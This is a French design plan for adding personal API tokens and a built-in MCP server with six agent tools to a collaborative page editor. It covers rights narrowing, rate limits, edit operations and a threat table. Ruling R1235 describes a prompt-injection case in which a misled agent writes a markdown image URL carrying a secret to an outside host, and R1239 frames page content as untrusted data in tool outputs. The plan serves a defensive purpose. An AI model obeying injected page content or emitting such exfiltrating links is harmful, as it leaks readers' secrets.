## Global Constraints

Celles des plans des lots 3 et 4 restent valables telles quelles (langue, commits sans aucune ligne d'attribution d'outil, ne jamais arrêter un processus qu'on n'a pas lancé, `data/instance` jamais ouvert par un binaire d'un lot en cours, aucun budget relâché, aucun test existant affaibli, chaque test vu rouge d'abord pour la bonne raison, pas d'attente fixe, un témoin vert pour chaque test qui prouve une absence). Ce qui suit vaut pour toute tâche de ce plan.

**Droits**
- **Un jeton ne crée pas un second chemin de droits.** Un appel par jeton est un appel **du compte du jeton**, restreint : `access.rs` calcule les droits du compte comme aujourd'hui, puis les restreint à la portée et au niveau du jeton, au même endroit. Aucune route, aucun outil MCP ne lit la table des jetons pour juger un droit. Droits d'un appel = droits du compte ∩ portée du jeton ∩ niveau du jeton (conception §5.6).
- **Fermé par défaut.** Une route ne s'ouvre à un jeton que si elle est dans la liste `TOKEN_ROUTES` ; toute autre répond `403 token_not_allowed`. Un test lit le routeur entier et rougit à toute route neuve qui n'est ni dans la liste, ni dans la liste des routes fermées. Ne s'ouvrent jamais à un jeton : les routes de session et de mot de passe, les jetons eux-mêmes, les membres, les invitations, le partage, la suppression définitive, `/sync`, `/events`.
- Ordre des refus, pour un appel par jeton : `403 bad_origin`, `401 invalid_token`, `403 token_not_allowed`, `429 token_busy`, `409 account_changed`, puis l'ordre de toujours (`404` d'une page non vue, **exactement** la réponse d'une page inconnue ; `403` ; `409 trashed` ; le corps). Une page hors de la portée du jeton est une page non vue : `404`, même corps.
- Un outil MCP et la route REST de la même opération appellent **la même fonction** (`crates/mementum-server/src/agent/`). Un outil ne fait rien qu'une route ne fait pas.
- Un message de refus tutoie, dit quoi faire, et ne recopie jamais une longue part de l'entrée (`mementum_md::excerpt`, R434). Le texte d'un jeton n'est **jamais** journalisé, ni rendu après sa création, ni mis dans une adresse.

**Écritures**
- **Toute écriture d'un agent dans une page passe par l'acteur de la page**, en une commande : validation, version s'il en faut une, une transaction, journal, diffusion, révision rendue (RESULTS, leçon 8 : révision et écriture dans la même section critique). `version_if_due` avant, `wrote` après (piège « Historique, côté serveur »).
- Une intégration dont la durée dépend d'un contenu rend son fil au moteur (`long_work::off_the_engine`, R863) ; la lecture et la validation d'un MMD se font par `mmd_reads.run` (R383) ; la file d'une page (`page_writes`, R435, R535) vaut pour les opérations comme pour `PUT /mmd`.
- Toute lecture d'une entrée venue d'un client croît comme elle (R380) : une liste d'opérations, un MMD, un nom d'espace ont leur forme dans les tests de linéarité, sous les bornes de R433.
- **Aucun bloc, aucune prop, aucune marque ne s'ajoute au schéma** : `SCHEMA_VERSION` reste à 1. Une écriture du serveur qui pose une marque passe par `value_refusal` (R493).
- Écritures du store : par `self.write()` ou `write_conn()`, dans la voie du compte du jeton (`attribute_writes_to`), jamais par `&self.pool` ; une tâche lancée par `tokio::spawn` depuis une route garde sa portée (`writes_by`) ; jamais deux écritures menées ensemble dans une tâche (R518).

**Client**
- Rien sur le chemin de l'ouverture d'une page ni de l'application : l'écran des jetons est chargé à la demande.
- Tout appel passe par `send` d'`api.ts`. Le texte d'un jeton ne va ni dans `localStorage`, ni dans un état qui survit à la fenêtre qui le montre, ni dans la console.
- Clavier, focus, « rien ne bouge sous le pointeur », Échap qui ne détruit rien : les règles de `CLAUDE.md`.

**Exécution**
- **Méthode (décision de Lenny du 2026-11-20, R935)** : pendant le lot, une tâche n'écrit et ne lance que **les tests de son ajout et les suites qu'elle touche directement** (le fichier de tests d'un module modifié, le test d'un contrat qu'elle change) ; elle a **une seule relecture**, sans re-relecture ni boucle : ses constats sont corrigés une fois par la tâche, ou notés au registre, « À reprendre à la fin du lot ». ## Décisions de ce plan

Forme : `Ruling: <décision> — <pourquoi> — <coût si faux>`.

**Périmètre**

- **Ruling R1210** : le lot livre les six outils de la « MCP v1 » du §9, les jetons personnels, et les routes REST dont ces outils ont besoin ; ni OpenAPI publié, ni SDK, ni CLI de contenu, ni webhooks — le §9 ne met en P1 que « MCP v1 […] avec jetons personnels », et « API REST » en P2 ; `docs/REPRISE.md` et le README disent « API REST complète » (écart E1) — si Lenny veut l'OpenAPI au lot 5 : une tâche de plus, les types portent déjà leurs schémas (R1238).
- **Ruling R1211** : le seul mode d'écriture est `direct` ; `mode` est facultatif, vaut `direct`, et `suggest` ou `branch` répondent `422 mode_unavailable` avec la raison — les suggestions sont en P3, et rien n'existe pour les montrer ni les accepter — la conception fait de `suggest` le défaut (§6.1, principe 5 ; écart E2) : en P3, le défaut changera, et un agent écrit pour le lot 5 qui omet `mode` écrira en suggestion ; c'est voulu, et dit dans la description de l'outil.
- **Ruling R1212** : `SCHEMA_VERSION` reste à 1 ; le refus d'une prop hors registre (R41) reste — un porteur durable demande un attribut neuf au schéma du client, donc une version de schéma, pour un besoin qui naît à l'import (lot 6) — un agent qui relit une page portant une prop inconnue ne peut pas la récrire par `replace_page` ; les opérations ciblées, elles, n'y touchent pas.

**Identité**

- **Ruling R1213** : un jeton s'écrit `mmt_` suivi des 43 caractères de `new_token()` ; la base garde son SHA-256 (`token_hash`), et ses quatre derniers caractères pour l'affichage — 256 bits tirés au hasard ne demandent pas Argon2, et un préfixe fixe se reconnaît par un détecteur de secrets — quatre caractères montrés retirent 24 bits à 256.
- **Ruling R1214** : un jeton ne voyage que dans `Authorization: Bearer` ; jamais dans une adresse, jamais dans un cookie ; une requête qui porte un `Bearer` ignore le cookie de session, et un `Bearer` qui n'est pas un jeton vivant répond `401 invalid_token`, sans retomber sur le cookie — un jeton dans une adresse finit dans le journal d'un mandataire ; retomber sur le cookie ferait agir un agent mal réglé sous la session d'un navigateur — aucun.
- **Ruling R1215** : `401 invalid_token` est la seule réponse d'un jeton mal formé, inconnu, révoqué, échu, ou dont le compte n'existe plus — une seule réponse ne dit rien à qui essaie — un agent ne sait pas si son jeton est échu ou révoqué : le message dit « révoqué, échu ou inconnu : crée-en un autre dans ton compte ».
- **Ruling R1216** : `AuthUser` porte par où l'appel est venu (`via: Via`, `Session` ou `Token(Arc<TokenGrant>)`) ; `TokenGrant { token_id, level, scope, can_trash }` ; toutes les fonctions d'`access.rs` gardent leur signature et restreignent d'elles-mêmes — c'est le seul moyen qu'aucune route n'oublie la restriction : elle n'a rien à faire — un champ de plus dans un type que toutes les routes prennent.
- **Ruling R1217** : la restriction se fait dans `mementum-acl`, par `SpaceAccess::narrowed(&self, cap: Level, roots: Option<&[Uuid]>) -> SpaceAccess` : ne restent que les pages vues qui sont une des `roots` ou sous l'une d'elles (toutes, sans `roots`) ; le niveau de chacune est le plus bas du sien et de `cap` ; le rôle devient `guest` avec des `roots`, et au plus `member` sans — la restriction ne peut que retirer : elle part du calcul du compte, jamais des lignes d'accès — une page sous une `root` que le compte ne voit pas (une sous-page plus fermée, P3) reste invisible, comme il faut.
- **Ruling R1218** : trois niveaux de jeton, `read`, `edit`, `full` ; `full` ne sert qu'à déplacer une page sous un autre parent (ce que la route demande déjà) ; **`Share` et `Delete` sont refusés à tout jeton**, quel que soit son niveau, dans `permit` (et leurs routes sont fermées : deux barrières) ; `Trash` est refusé sans l'option `can_trash` — moindre privilège (§6.1) ; la corbeille demande une confirmation humaine (§6.5) : l'option, cochée par la personne à la création, en tient lieu (écart E3, décision L4) — un agent ne peut pas partager une page ; c'est le but.
- **Ruling R1219** : un jeton de portée « pages » nomme au plus 50 pages d'**un seul** espace ; ses lignes partent avec la page (cascade) ; un jeton dont toutes les pages sont parties n'ouvre rien — une portée sur plusieurs espaces se fait par plusieurs jetons ; cinquante bornent ce que chaque appel relit — une personne qui veut cent pages crée deux jetons, ou prend leur page parente.
- **Ruling R1220** : un compte a au plus 20 jetons vivants ; un nom de jeton a 1 à 60 caractères, sans caractère de contrôle — un nom se montre dans des listes ; vingt bornent ce que la révocation en masse écrit — `409 token_limit`, qui dit d'en révoquer un.
- **Ruling R1221** : changer de mot de passe **révoque tous les jetons du compte**, dans la transaction du changement (`Store::change_password`, et `set_password` de la commande) — c'est le geste de qui pense avoir été volé (R120 : il ferme déjà toutes les sessions) ; un voleur de session aurait pu se faire un jeton — après un changement de mot de passe, Claude Code d'Alex demande un jeton neuf ; l'écran le dit avant de valider (décision L3).
- **Ruling R1222** : `TOKEN_ROUTES` : `GET /api/v1/me`, `GET …/spaces/{id}/tree`, `POST …/spaces/{id}/search`, `GET …/spaces/{id}/members` (noms seuls, R1247), `POST /api/v1/pages`, `POST …/spaces/{id}/pages/batch`, `GET` et `PATCH /api/v1/pages/{id}`, `POST …/trash`, `…/restore`, `…/duplicate`, `GET` et `PUT …/mmd`, `GET …/document`, `POST …/operations`, `GET …/backlinks`, `GET …/files/{fileId}`, et `POST /mcp`, `POST /mcp/readonly` — ce dont les six outils ont besoin, la lecture d'un fichier que le MMD nomme, rien d'autre — l'envoi d'un fichier par jeton manque à qui veut verser des images : une ligne de la liste et ses tests, quand les quotas du lot 7 seront là.

**Lire**

- **Ruling R1223** : `GET /api/v1/pages/{id}/document` rend `PageDocument { id, spaceId, title, parentId, path, level, editedAt, revision, mmd, truncated, next, children }` ; `GET …/mmd` ne change pas de corps, et gagne l'en-tête `ETag: "<révision>"` — le frontmatter YAML de la conception n'existe pas dans `mementum-md` (écart E5) : les métadonnées voyagent en JSON par la route, et l'outil `fetch` les écrit en tête de son texte — le frontmatter reste à faire avec les propriétés (P2).
- **Ruling R1224** : un alias de bloc est `b` suivi des premiers caractères, en base32 minuscule, du SHA-256 de l'identifiant du bloc : quatre au moins, autant qu'il en faut pour être seul dans la page à la lecture ; il se résout sans rien garder : le bloc de la page dont le hachage commence ainsi ; aucun : `stale_anchor` ; plusieurs : `ambiguous_anchor`, « relis la page » ; l'identifiant entier d'un bloc est toujours accepté — un alias par rang (`b1`, `b2`) change dès qu'un humain insère un bloc au-dessus, et le serveur est sans état ; un identifiant de bloc est un texte de cent octets choisi par un client (R941), qu'on ne montre pas à un modèle — la conception écrit `^b4` : la forme d'ici est `^bk7qa` (cinq à sept caractères).
- **Ruling R1225** : une lecture rend au plus `limit` octets de MMD (24 Kio par défaut, 64 Kio au plus), coupés entre deux blocs de premier niveau, avec `truncated: true` et `next` (l'alias du premier bloc non rendu) ; on reprend par `from=<alias>` ; un bloc de premier niveau plus gros que la borne est rendu seul, jusqu'à 256 Kio, au-delà remplacé par `<unloaded id="…"/>` — « plafond dur bien sous 25 000 tokens » (§6.5) — la conception pagine par `<unloaded>` partout (écart E14) ; un agent lit une page de 10 000 blocs en une trentaine d'appels.
- **Ruling R1226** : la révision et les blocs d'une lecture sortent de la même commande de l'acteur (`Hub::read_page`) ; le serveur garde, pour les révisions qu'il a servies, l'empreinte de chaque bloc (`agent/revisions.rs` : par page et révision, la liste `(empreinte de l'identifiant, empreinte du contenu)`, 16 octets par bloc, 16 Mio en tout, la moins récemment lue sortie d'abord) — c'est ce qui permet `on_conflict: "rebase"` sans garder d'anciens états : « ces blocs ont-ils changé depuis ta lecture » se lit dans deux listes d'empreintes — une révision sortie du cache, ou d'avant un redémarrage, vaut `409 revision_conflict` dès que la page a changé : l'agent relit, comme en `fail`.

**Écrire**

- **Ruling R1227** : une écriture complète (`PUT /mmd`, `replace_page`, restauration) s'écrit **par différence** (`PageDoc::write_diff`) : liste de frères par liste de frères, les correspondances de `kept_ids` ; un bloc inchangé n'est pas touché (aucun élément Yjs créé ni supprimé) ; des props changées s'écrivent en attributs ; un contenu en ligne changé est récrit **en entier** ; un bloc changé de place parmi ses frères est recréé au même `id`, les autres non touchés (la règle de R223) ; un bloc neuf est inséré, un bloc absent supprimé. Au-delà d'une part de blocs touchés que S0 mesure, l'écriture retombe sur `rewrite_blocks` — R40 et R188 : une frappe faite au même instant dans un bloc que l'écriture ne change pas est gardée — une frappe dans un bloc dont l'agent récrit le texte est perdue (limite LA-a) ; S0 dit si un contenu en ligne peut s'écrire par préfixe et suffixe communs sans risque pour les marques, et R1227 est récrit selon sa mesure.
- **Ruling R1228** : `str_replace` cherche `old` (1 à 2 000 caractères) dans le **texte brut** de chaque bloc (`mementum_md::block_text`), jamais à cheval sur deux blocs ; `new` est du texte brut, qui prend les marques du premier caractère remplacé (`replace_text`) ; sans `anchor`, `old` doit se trouver une fois dans la page, sauf `replace_all` — RESULTS, leçon 5 : compter sur le texte brut ; un remplacement de texte n'efface pas la frappe d'un autre dans le même bloc — pour changer une mise en forme, l'agent passe par `replace_block`.
- **Ruling R1229** : un appel est atomique par construction : les opérations sont résolues et vérifiées sur les blocs lus dans la commande de l'acteur, sans copie du document, puis appliquées en une transaction ; un refus (`no_match`, `ambiguous_match`, `stale_anchor`, `ambiguous_anchor`, `invalid_markdown`, `out_of_scope`) arrête tout avant d'écrire, et nomme l'opération par son rang — RESULTS, leçon 8 : valider sans copie — `warnings` existe dans la réponse et reste vide au lot 5 : la conception en fait des avertissements, ce plan des refus, parce qu'un appel « atomique » qui applique neuf opérations sur dix ne l'est pas.
- **Ruling R1230** : `no_match` rend au plus trois candidats (l'alias et 120 caractères du bloc), choisis par le plus long début de `old` trouvé, **parmi les blocs de la page lue** ; `ambiguous_match` rend au plus cinq alias — « le serveur renvoie les candidats les plus proches » (§6.3) ; la recherche est un parcours, linéaire en la page — un candidat est du texte de la page même que l'agent écrit : rien d'une autre page n'en sort.
- **Ruling R1231** : `on_conflict: "rebase"` (défaut) : si la page a la révision `base_revision`, l'appel s'applique ; sinon, si les empreintes de `base_revision` sont au cache et que chaque bloc que l'appel touche (et ses sous-blocs, pour un retrait ou un remplacement) a la même empreinte, il s'applique ; sinon `409 revision_conflict`, avec le MMD à jour des blocs en cause (borné par R1225) et la révision courante. `"fail"` : `409` dès que la révision diffère. Sans `base_revision` : les opérations s'appliquent telles qu'elles se résolvent, sauf `replace_page`, `replace_block` et `delete_block`, qui l'exigent (`422 revision_required`) — un `str_replace` porte sa propre précondition (son `old`) ; un remplacement de bloc, non — un agent paresseux qui n'envoie jamais de révision ne peut que remplacer du texte et insérer.
- **Ruling R1232** : les blocs qu'une opération insère reçoivent des identifiants neufs, quoi que porte son MMD ; `replace_block` donne l'identifiant du bloc remplacé au premier bloc neuf du même type (les fils de commentaires gardent leur bloc) ; `replace_page` suit R201, et un alias écrit dans son MMD désigne le bloc de cet alias — RESULTS, leçon 8 ; R639 : un `id` recopié serait défait par le dédoublonnage — aucun.
- **Ruling R1233** : `replace_page` par jeton est refusé (`409 page_in_use`) tant qu'une connexion de synchro qui peut écrire est ouverte sur la page, par qui que ce soit (`Hub::writers` ; un agent n'en ouvre pas) : le message dit d'utiliser les opérations ciblées. `PUT /mmd` ne refuse pas — §6.3 : « Refusé (409) si des humains éditent en ce moment » ; `PUT /mmd` existe depuis le lot 1 sans ce refus, et toute la suite de bout en bout s'en sert sur des pages ouvertes (écart E6, décision L6) — avec l'écriture par différence, le refus protège moins qu'avant ; le lever est une ligne.
- **Ruling R1234** : avant la première écriture d'un jeton sur un contenu que la dernière version de la page ne garde pas **et que ce jeton n'a pas écrit lui-même**, l'acteur coupe une version ordinaire (`periodic`), sans attendre les dix minutes ; `doc_updates.token_id` dit qui a écrit quoi — « direct : appliqué tout de suite, mais attribué et annulable » (§6.4) : ce qu'un agent remplace se retrouve dans l'historique ; un agent seul ne coupe rien (il ne fait donc pas tourner les cent versions), et une raison neuve demanderait de rebâtir `doc_versions` (son `CHECK`) — 28 ms et 3,2 Mo pour une page de 10 000 blocs, sur l'appel de l'agent, pas sur une frappe ; un agent et un humain qui alternent coupent une version par alternance (limite LA-e).
- **Ruling R1235** : une écriture par jeton ne peut pas faire entrer dans une page un bloc `image`, `video` ou `audio` dont l'adresse est une adresse web que la page ne portait pas déjà : `422 external_media`. Un lien, un signet (sans aperçu, R250) et un bloc `file` passent — c'est le canal d'exfiltration de PromptArmor (§6.4) : un agent trompé par le contenu d'une page écrit `![](https://ailleurs/?q=<secret>)`, et le navigateur de chaque lecteur envoie le secret ; sans mode suggestion, rien n'est « en attente » — un agent ne peut pas verser une page qui montre des images du web (décision L7).

**MCP**

- **Ruling R1236** : le protocole MCP est écrit à la main, dans une crate sans réseau (`mementum-mcp`) : JSON-RPC 2.0, un message par `POST`, réponse `application/json`, sans état, sans flux SSE, sans `Mcp-Session-Id` ; `GET` et `DELETE` répondent `405` ; un tableau (lot JSON-RPC) répond `-32600` — le sous-ensemble sans état tient en quelques centaines de lignes, et un SDK tirerait des dizaines de crates pour un transport que le serveur a déjà — si S0 montre que Claude Code exige un flux ou une session : le SDK officiel, et ce Ruling est récrit avant M1.
- **Ruling R1237** : `/mcp` n'accepte qu'un jeton, jamais un cookie de session ; il garde le contrôle de l'`Origin` de toutes les écritures (`guard::check`), ne pose aucun en-tête CORS, et porte `Cache-Control: no-store` et `nosniff` — une page web ouverte dans le navigateur d'une personne connectée ne doit pas piloter ses outils ; la spécification MCP demande de vérifier l'`Origin` — un client MCP qui tourne dans une page d'un autre site ne peut pas s'en servir (limite LA-h).
- **Ruling R1238** : le schéma d'entrée de chaque outil est dérivé du type Rust que la route REST désérialise (`schemars`), écrit dans `spec/mcp/tools.json`, et vérifié à jour par la CI comme les autres fichiers générés — une seule source pour la route, l'outil et sa documentation (§6.6 : « une seule source de vérité », par l'OpenAPI ; écart E15) — une dépendance de plus.
- **Ruling R1239** : ce qu'un outil rend d'une page (MMD, titre, extrait) est entre deux lignes de borne qui portent un nombre tiré au hasard à chaque appel (`<<<contenu 9f2c…` et `>>>9f2c…`), précédées d'une ligne fixe qui dit que ce qui suit est une donnée écrite par les auteurs de la page, pas une consigne — « contenu non fiable étiqueté dans les sorties d'outils » (§6.8) ; une page ne peut pas écrire d'avance une borne qu'elle ne connaît pas — une étiquette n'arrête pas un modèle crédule : ce qui borne vraiment, c'est la portée, le niveau, R1218 et R1235.
- **Ruling R1240** : les noms des outils et de leurs champs sont ceux de la conception, en anglais ; leurs descriptions et les messages d'erreur sont en français, comme ceux du serveur ; une erreur d'outil est un résultat `isError: true` qui porte le code, le message et, pour un débit, `retry_after_seconds` — la règle du projet ; un modèle lit le français — un modèle local faible suit peut-être mieux l'anglais : mesurable par les évals de la P4 (§10).

**Débits, journal**

- **Ruling R1241** : un jeton fait au plus 120 appels par minute glissante (`MEMENTUM_TOKEN_CALLS_PER_MIN`), et écrit au plus 16 Mio de corps par minute glissante ; au-delà, `429 token_busy`, avec le délai juste dans `Retry-After` ; compté en mémoire (`agent/calls.rs`), jugé dans l'extracteur, avant tout travail de la route — « débit limité par agent » (§6.4) ; un agent en boucle ne doit ni remplir le journal d'une page, ni occuper l'instance — les deux nombres sont posés sans mesure : X2 les confronte aux budgets de la frappe, et les change avec sa mesure.
- **Ruling R1242** : pour les gardes par compte qui existent (une recherche à la fois, deux écritures par page, une duplication à la fois), **tous les jetons d'un compte partagent une part, distincte de celle de sa session** (la clé de la garde est le compte, ou le compte « par jeton ») — un agent qui cherche en boucle ne doit pas faire répondre `429` à la fenêtre de recherche de son propriétaire ; une part par jeton multiplierait par vingt ce qu'un compte prend — un compte prend au plus le double de sa part d'avant.
- **Ruling R1243** : les pages créées en lot avec leur contenu comptent dans le débit des duplications du compte (64 Mio de documents bâtis par minute, R605) et s'écrivent dans la voie des copies (`Lane::Copies`, R607), en une transaction — c'est le même travail : des documents bâtis hors de tout acteur, puis écrits d'un coup — un agent qui verse beaucoup attend comme s'il dupliquait.
- **Ruling R1244** : chaque appel par jeton laisse une ligne au journal d'activité (`token_calls`) ; les lignes sont gardées en mémoire et écrites par paquets (256 au plus, toutes les deux secondes au plus), dans une voie à elles (`Lane::Calls`), avec `last_used_at` ; mille lignes gardées par jeton — une écriture sur le disque par lecture d'agent coûterait une validation à chaque `fetch` (250 ms par validation sur le disque de la CI) — un arrêt brutal perd les deux dernières secondes du journal ; ce qu'un agent a **écrit** reste dit par `doc_updates.token_id` (limite LA-f).
- **Ruling R1245** : le journal ne garde ni le texte cherché, ni un MMD, ni un `old` ou un `new` : l'outil, la page, l'issue, le code du refus, les révisions d'avant et d'après, le nombre de blocs touchés — la requête d'une personne n'entre dans aucun journal (R917) ; un journal qui recopie des contenus devient une seconde copie de pages, lisible après un retrait de droit — on ne voit pas *ce que* l'agent a écrit dans le journal : on le voit dans l'historique de la page.
- **Ruling R1246** : la date de modification du contenu d'une page (`page_edits.edited_at`, `edited_by`) est posée par l'indexeur, dans la transaction où il indexe la page, d'après la dernière entrée de son journal ; la migration la remplit pour les pages existantes — écart E10 du lot 4 : `nodes.updated_at` ne suit que le titre et la place ; l'écrire à chaque frappe ajouterait une écriture au chemin de la frappe — la date a jusqu'à quinze secondes de retard (L9 du lot 4), et le filtre « modifiée depuis » aussi.
- **Ruling R1247** : `workspace_info` rend le compte, le jeton (nom, niveau, portée, échéance), les espaces de sa portée, et, pour un espace nommé et un jeton de portée « espace » ou plus large, ses membres : **le nom et le rôle, jamais l'adresse** — « qui suis-je, espaces accessibles et leurs membres » (§6.5) ; une adresse e-mail rendue à un agent sort de l'instance au premier appel d'un modèle hébergé — un agent ne peut pas écrire à quelqu'un : il n'a aucun canal sortant.
- **Ruling R1248** : les filtres de la recherche (`createdBy`, `editedAfter`, `editedBefore`) **réduisent l'ensemble des pages permises** avant l'index (`allowed_pages`), sans rien ajouter à l'index ; ils sont dans le corps du `POST` — l'index n'a ni auteur ni date, et un champ de plus demanderait de le reconstruire ; toute la séparation tient déjà à cet ensemble (piège de S5 du lot 4) — un filtre ne coûte qu'une lecture de `nodes` et de `page_edits` pour les pages vues ; mesuré en S7.
- **Ruling R1249** : dès que `0006_agents.sql` est sur `main`, toute correction de schéma que demanderait encore la recette du lot 4 s'écrit dans `0006`, et `0005_search.sql` ne change plus ; `0006` ne modifie aucune table de `0005` — sinon deux lots récrivent des migrations l'un sous l'autre, et toute base de développement est refusée deux fois — la clôture du lot 4 acte ce gel ; si Lenny veut garder `0005` ouverte, S1 attend (« La migration »).

## Architecture

### Le jeton, de la création à la révocation

```
POST /api/v1/tokens (session, mot de passe redemandé)          api_tokens(hash, hint, level, scope…)
        └─ rend « mmt_… » une fois ───────────────►  la personne le colle dans son agent
Authorization: Bearer mmt_…                                    api_token_pages(token_id, node_id)
        └─ AuthUser (auth.rs) : hachage → jeton vivant → compte → via = Token(grant)
              ├─ route hors de TOKEN_ROUTES ─► 403 token_not_allowed
              ├─ débit (agent/calls.rs)      ─► 429 token_busy
              └─ access.rs : droits du compte (cache, comme aujourd'hui)
                     └─ SpaceAccess::narrowed(niveau, pages) ─► ce que la route voit
```

- **Création** : `POST /api/v1/tokens`, par une session seulement, avec le mot de passe actuel (décision L2 ; vérifié par `verify_password`, compté par le frein des connexions). Corps `CreateToken { name, level, scope: "all" | "space" | "pages", spaceId?, pageIds?, canTrash, expiresInDays?, password }`. Le store vérifie dans la transaction que le compte a un rôle dans l'espace nommé et lit chaque page nommée (par `access.rs`, avant ; la transaction revérifie que les pages sont de l'espace). Réponse `201`, `TokenCreated { token, info }` : la seule fois où `token` paraît.
- **Affichage** : `GET /api/v1/tokens` rend `TokenInfo[]` (`id`, `name`, `hint`, `level`, `scope`, `space`, `pages` avec leur titre **si le compte les voit encore**, `canTrash`, `createdAt`, `expiresAt`, `lastUsedAt`, `revokedAt`), les vivants d'abord. Jamais le hachage.
- **Révocation** : `DELETE /api/v1/tokens/{id}` pose `revoked_at` ; la ligne reste, pour le journal. Un jeton d'un autre compte : `404`, comme un jeton inconnu. Révoqué deux fois : `204`, rien n'est écrit.
- **Expiration** : `expires_at`, jugée à chaque appel contre l'horloge du serveur. Défaut de l'écran : 90 jours (décision L1).
- **Ce qui rend un jeton sans effet, sans y toucher** : le compte perd son rôle dans l'espace (ses droits sont recalculés à chaque appel) ; la page nommée est supprimée (cascade) ; le compte change de mot de passe (R1221).
- **Un appel long** : comme `SessionUser` relit sa session sous le verrou de la page (R209), une écriture par jeton relit que le jeton vit encore (`AppState::caller_still_live`) une fois sa place prise, juste avant d'écrire.

### Comment un jeton traverse `access.rs`

`find_space_access(user, space)` fait, pour un appel par jeton : (1) si la portée du jeton exclut l'espace, `None`, **avant** de lire le rôle (la règle de R99 : la réponse d'un espace inconnu, sans que l'espace soit lu) ; (2) le calcul du compte, par le cache, comme aujourd'hui ; (3) `narrowed(niveau, pages)`. `space_access`, `seen_node`, `node_access`, `role_at_least` passent par là. `permit` et `permit_level` reçoivent l'appelant, et refusent `Share` et `Delete` à tout jeton, `Trash` sans `can_trash` (`403 forbidden`, avec un message qui dit que c'est le jeton). La création à la racine d'un espace, jugée aujourd'hui sur le rôle, passe par une fonction neuve d'`access.rs`, `permit_root_page`, qui demande en plus le niveau `edit` du jeton. Le résultat restreint n'est pas gardé en cache au départ : S5 mesure la restriction, et la range sous `(jeton, espace, rev)` dans `AccessCache` si elle dépasse 1 ms au p95 pour 10 000 pages (leçon 3).

Ce que cela garantit, et que les tests de S5 tiennent : la restriction ne lit jamais une ligne d'accès ; elle ne rend jamais une page que le calcul du compte ne rend pas, ni un niveau plus haut ; une page hors de la portée suit le chemin d'une page non vue, donc reçoit sa réponse, octet pour octet.

### L'écriture d'un agent

```
POST …/operations ─► agent::update_page
   1. node_access(Edit)                       (refus, avant le corps)
   2. mmd_reads.run : lire les MMD des opérations, estimer (write_cost), R1235
   3. page_writes.reserve(page, compte « par jeton »)   ─► 429 page_busy
   4. caller_still_live, node_access(Edit) de nouveau    (R89, R209)
   5. Hub::edit_page(page, Edit { ops, base, auteur })   ─► une commande de l'acteur :
        lire les blocs ─ résoudre alias et textes ─ juger le conflit (R1231)
        ─ version d'avance (R1234) ─ une transaction ─ journal (token_id) ─ diffusion
        ─ révision, blocs touchés
   6. réponse : UpdateResult { revision, mmd, truncated, warnings: [] }
```

`mementum-crdt` porte la mécanique sans réseau : `diff.rs` (`write_diff`), `ops.rs` (`Operation`, `Plan`, `PageDoc::plan(&ops, &hashes) -> Result<Plan, OpRefusal>`, `PageDoc::apply(plan) -> Applied`), `anchors.rs` (alias, empreintes). `mementum-sync` porte la commande de l'acteur. `mementum-server/src/agent/` porte les opérations que routes et outils partagent.

### Le serveur MCP

Dans le binaire `mementum` (« serveur MCP intégré », §6.5), sur le port du serveur. `crates/mementum-mcp` : le protocole (lire un message, négocier la version, répondre), les six descripteurs d'outils, la mise en texte des résultats (bornes de R1239, plafonds de R1225), la ressource `mementum://spec/mmd` (le texte de `spec/mmd/SPEC.md`, écrit par la Task D d'après le §6.2, embarqué par `include_str!`). `crates/mementum-server/src/routes/mcp.rs` : la route, l'extracteur `AuthUser` (jeton seul), et l'appel de la fonction d'`agent/` de chaque outil.

Méthodes : `initialize` (rend la version demandée si elle est dans la liste que S0 arrête, sinon la plus récente de la liste ; capacités `tools` et `resources`), `notifications/initialized` (`202`), `ping`, `tools/list`, `tools/call`, `resources/list`, `resources/read`. Toute autre : `-32601`. `/mcp/readonly` ne liste et n'appelle que `search`, `fetch` et `workspace_info`.

| Outil | Entrée | Sortie | Droit | Bornes |
|---|---|---|---|---|
| `workspace_info` | `{ space? }` (nom ou identifiant) | le compte, le jeton, les espaces de la portée ; avec `space` : ses membres (nom, rôle) et ses pages de premier niveau | un jeton vivant | 50 espaces, 200 membres, 200 pages, puis `truncated` |
| `search` | `{ query, space?, created_by?, edited_after?, edited_before?, after? }` | titres, fils d'Ariane, extraits, alias du bloc trouvé | `read` ; `space` implicite si la portée n'en ouvre qu'un, sinon exigé | celles de la route du lot 4 (200 caractères, 8 mots, 20 pages par réponse, plancher de 50 ms) |
| `fetch` | `{ id, anchors?, from?, limit? }` : identifiant ou adresse d'une page, ou nom ou identifiant d'un espace | une page : métadonnées, révision, MMD ; un espace : le plan de son arbre (titre et identifiant par ligne) | `read` | R1225 ; 500 lignes de plan |
| `create_pages` | `{ space?, parent?, section?, pages: [{ title, markdown? }] }` | l'identifiant, le titre et l'adresse de chaque page | racine : membre et niveau `edit` ; sous une page : `edit` sur elle | 20 pages, 2 Mio de corps, 12 000 blocs par page ; R1243 ; `section` vaut `private` |
| `update_page` | `{ page, base_revision?, on_conflict?, mode?, operations }` | révision, MMD des blocs touchés | `edit` | 100 opérations, 2 Mio de corps ; R1228 à R1235 |
| `manage_pages` | `{ action: "move" \| "rename" \| "duplicate" \| "trash" \| "restore", page, parent?, after?, title? }` | la page après le geste | ceux des routes : `edit` ; autre parent : `full` ; corbeille : `can_trash` | une page par appel ; débit des duplications |

Un nom d'espace se résout sans casse parmi les espaces de la portée ; deux espaces du même nom : `ambiguous_space`, avec leurs identifiants. Un nom fait 200 caractères au plus.

### Ce que la personne voit

- **« Jetons d'API »**, dans le menu du compte (sélecteur d'espace, R80) : la liste de ses jetons, « Créer un jeton » (nom, portée, niveau, corbeille, échéance, mot de passe), le jeton montré une fois avec « Copier » et la commande `claude mcp add` prête à coller, « Révoquer » avec confirmation.
- **« Activité »** d'un jeton : ses mille derniers appels (date, outil, page par son titre si le compte la voit encore, issue), le plus récent d'abord.
- **Dans l'historique d'une page** : une version dont un auteur a écrit par jeton le dit (« Alex, par un agent »), pour tous ceux qui lisent l'historique ; le nom du jeton n'est montré qu'à son propriétaire, dans son activité.
- Rien d'autre ne change dans l'éditeur : une écriture d'agent arrive comme celle d'un autre onglet.

### Menaces, et ce qui les borne

| Menace | Ce qui la borne | Ce qui reste |
|---|---|---|
| **Un jeton volé** (fichier de configuration lu, dépôt public, journal d'un mandataire) | portée et niveau (R1217, R1218) ; expiration (90 jours par défaut) ; révocation à effet immédiat ; ni partage, ni invitation, ni suppression définitive, ni jeton neuf par jeton ; jamais dans une adresse (R1214) ; préfixe reconnaissable (R1213) ; « dernière utilisation » et activité visibles ; le mot de passe changé révoque tout (R1221) | jusqu'à la révocation, le voleur lit et écrit ce que le jeton ouvre ; rien ne prévient la personne (pas d'e-mail) |
